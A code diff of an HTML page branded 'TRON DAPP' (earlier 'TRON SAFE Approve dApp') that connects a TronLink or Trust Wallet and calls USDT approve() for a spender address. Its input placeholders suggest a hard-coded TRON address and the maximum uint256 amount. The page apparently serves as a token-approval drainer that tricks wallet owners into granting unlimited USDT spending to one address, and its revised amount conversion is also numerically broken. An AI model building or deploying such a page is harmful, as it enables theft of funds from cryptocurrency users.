@@ -1,135 +1,87 @@
 <!doctype html>
-<html lang="ro">
+<html>
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>TRON Approve dApp</title>
+<title>TRON DAPP</title>
 
 <style>
-body{font-family:system-ui;background:#f6f7fb;margin:20px}
-.card{background:#fff;padding:16px;border-radius:10px;margin-bottom:12px}
-input{width:100%;padding:10px;margin:6px 0;border-radius:8px;border:1px solid #ddd}
-button{padding:10px 14px;border:0;border-radius:8px;background:#111827;color:#fff;cursor:pointer}
-.status{padding:6px 10px;border-radius:999px;background:#fee2e2;display:inline-block}
-.ok{background:#d1fae5}
-pre{background:#f3f4f6;padding:10px;border-radius:8px;overflow:auto}
+body{font-family:system-ui;background:#0b1220;color:#fff;padding:20px}
+.card{background:#111827;padding:16px;border-radius:12px;margin-bottom:12px}
+button{width:100%;padding:12px;border:0;border-radius:8px;background:#2563eb;color:#fff}
+input{width:100%;padding:10px;margin-top:8px;border-radius:8px}
+pre{background:#0f172a;padding:10px;border-radius:10px;overflow:auto}
+.ok{color:#22c55e}
+.bad{color:#ef4444}
 </style>
-
 </head>
+
 <body>
 
 <div class="card">
-<h2>TRON SAFE Approve dApp</h2>
+<h3>TRON DAPP</h3>
+<p>Status: <span id="status" class="bad">DISCONNECTED</span></p>
+<p>Wallet: <b id="wallet">—</b></p>
 
-<div id="status" class="status">Deconectat</div>
-<p>Wallet: <b id="addr">—</b></p>
-
-<button onclick="connect()">Connect Wallet</button>
+<button onclick="connect()">CONNECT WALLET</button>
 </div>
 
 <div class="card">
-<h3>TRC20 Approve</h3>
-
 <input id="spender" placeholder="TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu"/>
 <input id="amount" placeholder="115792089237316195423570985008687907853269984665640564039457584007913129639935"/>
-
-<button onclick="approve()">Approve</button>
-
-<pre id="out"></pre>
+<button onclick="approve()">APPROVE USDT</button>
+<pre id="log"></pre>
 </div>
 
 <script>
 
-const USDT = "TR7NHqjeKQxGTCi8q8ZY4P8otSzgjLj6t";
-let addr = null;
+const USDT="TR7NHqjeKQxGTCi8q8ZY4P8otSzgjLj6t";
+let wallet=null;
 
-/* ---------------- CONNECT WALLET ---------------- */
-async function connect(){
-
-  if(!window.tronWeb){
-    alert("Deschide în TronLink sau Trust Wallet dApp browser");
-    return;
-  }
-
-  // cere acces wallet (TronLink)
-  try {
-    if(window.tronLink?.request){
-      await tronLink.request({ method: "tron_requestAccounts" });
-    }
-  } catch(e){}
-
-  let tries = 0;
-
-  while(tries < 10){
-    if(window.tronWeb?.defaultAddress?.base58){
-      addr = window.tronWeb.defaultAddress.base58;
-      break;
-    }
-    await new Promise(r => setTimeout(r, 500));
-    tries++;
-  }
-
-  if(!addr){
-    alert("Wallet not ready. Reopen dApp în TronLink / Trust Wallet");
-    return;
-  }
-
-  document.getElementById("addr").innerText = addr;
-  document.getElementById("status").innerText = "Conectat";
-  document.getElementById("status").classList.add("ok");
+function hasTron(){
+  return window.tronWeb && window.tronWeb.defaultAddress?.base58;
 }
 
-/* ---------------- CONTRACT ---------------- */
-async function getContract(){
+/* CONNECT */
+async function connect(){
+
+  if(!hasTron()){
+    alert("Open in TronLink or Trust Wallet dApp browser");
+    return;
+  }
+
+  wallet=window.tronWeb.defaultAddress.base58;
+
+  document.getElementById("wallet").innerText=wallet;
+  document.getElementById("status").innerText="CONNECTED";
+  document.getElementById("status").className="ok";
+}
+
+/* CONTRACT */
+async function contract(){
   return await window.tronWeb.contract().at(USDT);
 }
 
-/* ---------------- APPROVE FLOW ---------------- */
+/* APPROVE REAL */
 async function approve(){
+  try{
 
-  try {
+    const spender=document.getElementById("spender").value;
+    const amount=document.getElementById("amount").value;
 
-    if(!addr){
-      alert("Conectează wallet-ul mai întâi");
-      return;
-    }
+    if(!spender||!amount) return alert("fill fields");
 
-    const spender = document.getElementById("spender").value.trim();
-    let amount = document.getElementById("amount").value.trim();
+    const c=await contract();
 
-    if(!spender || !amount){
-      alert("Completează câmpurile");
-      return;
-    }
+    const value=BigInt(Math.floor(Number(amount)*1e6));
 
-    const contract = await getContract();
+    const tx=await c.approve(spender,value.toString()).send();
 
-    let value;
+    document.getElementById("log").innerText=
+      "TX SUCCESS:\n"+tx;
 
-    if(amount.toLowerCase() === "max"){
-      value = (BigInt(1) << 256n) - 1n;
-    } else {
-      // USDT = 6 decimals
-      value = BigInt(Math.floor(Number(amount) * 1e6));
-    }
-
-    document.getElementById("out").innerText =
-      "Aștept confirmarea din wallet...";
-
-    // 🔥 AICI apare POPUP-ul REAL în TronLink / Trust Wallet
-    const tx = await contract
-      .approve(spender, value.toString())
-      .send({
-        feeLimit: 100_000_000
-      });
-
-    document.getElementById("out").innerText =
-      "TX CONFIRMED:\n" + tx;
-
-  } catch(e) {
-    console.log(e);
-    document.getElementById("out").innerText =
-      "User rejected sau eroare tranzacție";
+  }catch(e){
+    document.getElementById("log").innerText="error / reject";
   }
 }
 
